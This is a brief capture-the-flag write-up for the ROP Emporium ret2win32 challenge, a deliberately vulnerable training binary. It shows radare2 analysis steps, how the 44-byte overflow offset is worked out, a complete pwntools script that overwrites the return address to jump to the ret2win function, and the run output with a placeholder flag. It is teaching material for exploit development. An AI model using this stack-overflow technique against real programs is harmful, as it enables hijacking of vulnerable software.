# Ret2Win32 (Quick)

*Created: 5.22.2020*

*Last Updated: 5.22.2020*

Read the [problem description](https://ropemporium.com/challenge/ret2win.html) for what you need to do to start tackling the problem.

This is a memory overwrite problem where we need to send a buffer to overwrite the space allocated for a local variable and ebp, and then pass a return address to a function not normally called during execution. 

Run the following commands to start your analysis of the ret2win32 executable. 

```
r2 -Ad ./ret2win32

(in radare now)

s main

Vpp 
(to enter visual mode and see the file's disassembly
```

In *main* you should see that there is a call to the pwnme function. If you keep looking, you should find a ret2win function that prints the flag, but ret2win is not normally called during program execution.

In the pwnme function you should see a local variable local_28h. 

The 28h implies that 28h bytes of memory is allocated for user input. 28h in decimal is 40.

Then we need 4 bytes to overwrite ebp. 

Now we need to find the address of ret2win. 

```
|   sym.ret2win ();
|           0x08048659      55             push ebp   -> address of ret2win that we will make our new return address in our evil input       
```

Using pwntools we can write our exploit now. 

```
#!/usr/bin/env python2
from pwn import *

#start the ./ret2win32 process and save it in variable p
p = process('./ret2win32')

bufferToSend = "A"*44
retAddrOfWin = p32(0x08048659)

evil = bufferToSend + retAddrOfWin

print(p.recvuntil('fgets!'))

p.sendline(evil)

print(p.recvall())
```

Then we run the exploit. 

```
~/pwn/ret2win32$ python exploit.py 
[+] Starting local process './ret2win32': pid 11519
ret2win by ROP Emporium
32bits

For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
[+] Receiving all data: Done (65B)
[*] Process './ret2win32' stopped with exit code -11 (SIGSEGV) (pid 11519)


> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
```

Yay. The flag!
